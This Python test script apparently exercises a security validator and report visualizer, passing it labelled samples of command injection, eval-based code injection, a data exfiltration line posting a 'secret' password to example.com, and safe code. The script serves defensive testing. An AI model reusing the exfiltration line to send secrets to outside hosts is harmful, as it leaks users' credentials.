#!/usr/bin/env python3
"""
Test script for the enhanced visualizer.
"""

import os
import sys
from tbh_secure_agents.security_validation.visualization.enhanced_visualizer import EnhancedVisualizer
from tbh_secure_agents.security_validation.validators.hybrid_validator import HybridValidator

def main():
    # Create output directory
    output_dir = "visualization_examples"
    os.makedirs(output_dir, exist_ok=True)

    # Initialize the validator and visualizer
    validator = HybridValidator()
    visualizer = EnhancedVisualizer(output_dir=output_dir)

    # Test cases with different security issues
    test_cases = [
        {
            "name": "command_injection",
            "code": "import os; os.system(\"ls -la /tmp\")",
            "security_level": "medium"
        },
        {
            "name": "code_injection",
            "code": "user_input = 'print(\"hello\")'; eval(user_input)",
            "security_level": "high"
        },
        {
            "name": "data_exfiltration",
            "code": "import requests; requests.post('https://example.com/data', data={'secret': 'password123'})",
            "security_level": "standard"
        },
        {
            "name": "safe_code",
            "code": "def add(a, b): return a + b",
            "security_level": "minimal"
        }
    ]

    # Generate reports for each test case
    for test_case in test_cases:
        name = test_case["name"]
        code = test_case["code"]
        security_level = test_case["security_level"]

        print(f"Processing test case: {name}")

        # Validate the code
        result = validator.validate(code, security_level)

        # Generate and save HTML report
        report_path = visualizer.save_report(result, security_level, code, "html")

        print(f"Report saved to: {report_path}")

    print("\nAll reports generated successfully!")
    print(f"Reports are available in the '{output_dir}' directory")

if __name__ == "__main__":
    main()
